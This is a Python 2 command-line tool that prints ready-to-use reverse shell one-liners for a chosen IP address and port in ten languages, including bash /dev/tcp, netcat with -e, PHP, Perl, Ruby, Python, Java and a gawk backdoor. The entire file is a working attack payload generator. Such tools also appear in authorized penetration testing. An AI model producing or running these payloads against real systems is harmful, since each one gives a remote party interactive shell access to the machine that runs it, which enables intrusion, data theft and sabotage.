#!/usr/bin/env python
from termcolor import *
import sys 
import argparse
import re


def shell(ip,port,language):
	shells = {
	'bash' : "0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196".format(ip,port),
	'php' : "php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i <&3 >&3 2>&3\");'".format(ip,port),
	'netcat' : "nc -e /bin/sh {0} {1}".format(ip,port),
	'telnet' : "rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p".format(ip,port),
	'perl' : "perl -e 'use Socket;$i=\"{0}\";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'".format(ip,port)	,
	'perl-windows' : "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{0}:{1}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'".format(ip,port),
	'ruby' : "ruby -rsocket -e'f=TCPSocket.open(\"{0}\",{1}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ip,port),
	'java' : ["r = Runtime.getRuntime()", "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])".format(ip,port), "p.waitFor()"],
	'python' : "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ip,port),
	'gawk' : ["#!/usr/bin/gawk -f", "\n", "BEGIN {", "        Port    =       {}".format(port), "        Prompt  =       \"bkd> \"", "\n", "        Service = \"/inet/tcp/\" Port \"/0/0\"", "        while (1) {", "                do {", "                        printf Prompt |& Service", "                        Service |& getline cmd", "                        if (cmd) {", "                                while ((cmd |& getline) > 0)", "                                        print $0 |& Service", "                                close(cmd)", "                        }", "                } while (cmd != \"exit\")", "                close(Service)", "        }", "}"]
	}

	if language in shells and language != "java" and language != "gawk":
		text = colored("[+] " + language.upper() + " REVERSE SHELL", 'red', 'on_green')
		print text, "\n", shells[language]
	elif language == "java":
		text = colored("[+] " + language.upper() + " REVERSE SHELL", 'red', 'on_green')
		print text, "\n", '\n'.join(shells['java'])
	elif language == "gawk":
		text = colored("[+] " + language.upper() + " REVERSE SHELL", 'red', 'on_green')
		print text, "\n", '\n'.join(shells['gawk'])
	else:
		for x in shells:
			if x != "java" and x != "gawk":
				text = colored("[+] " + x.upper() + " REVERSE SHELL", 'red', 'on_green')
				print text, "\n", shells[x], "\n\n"
			elif x == "java":
				text = colored("[+] " + x.upper() + " REVERSE SHELL", 'red', 'on_green')
				print text, "\n", '\n'.join(shells['java']), "\n\n"
			elif x == "gawk":
				text = colored("[+] " + x.upper() + " REVERSE SHELL", 'red', 'on_green')
				print text, "\n", '\n'.join(shells['gawk']), "\n\n"
		

def main():
	languages = ['bash', 'php', 'netcat', 'telnet', 'perl', 'perl-windows', 'ruby', 'java', 'python', 'gawk']
	parser = argparse.ArgumentParser(description='Hands on the wheel reverse shell\'s =) all reverse shells used on this script was taken from https://highon.coffee/blog/reverse-shell-cheat-sheet/')
	parser.add_argument('-i', dest='ip', help='ip address to connect (Ex: 192.168.0.1, 10.10.15.10)')
	parser.add_argument('-p', dest='port', help='port to connect (Ex: 8080, 1337, 443)', type=int)
	parser.add_argument('-l', dest='lang', help='programming language to use generate the revese shell (Ex: python, perl, php). if its not set, going to print them all')
	parser.add_argument('-a', dest='avaiable', help='print list of avaiable programming languages to generate reverse shell.', action='store_true')
	args = parser.parse_args()	
	if args.ip != None:
		if re.match("^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", args.ip, flags=0):
			if 1 <= args.port <= 65535:
				if args.lang != None and args.lang in languages:
					shell(args.ip, args.port, args.lang)
				elif args.lang == None or args.lang == args.lang:
					text = colored("[!] Language option not set, going to generate all avaiable reverse shells.", 'white', 'on_red')
					print text + "\n\n\n"
					shell(args.ip, args.port, args.lang)
			else:
				cprint("[!] Invalid tcp port.", 'white', 'on_red')
		else:
			cprint("[!] Invalid IPv4 address.", "white", "on_red")
	elif args.avaiable == True:
		langs = ", ".join(languages)
		text = colored("[+] Languages avaiable: " + langs, "white", "on_blue") 
		print  text
	else:
		parser.parse_args(['-h'])

main()



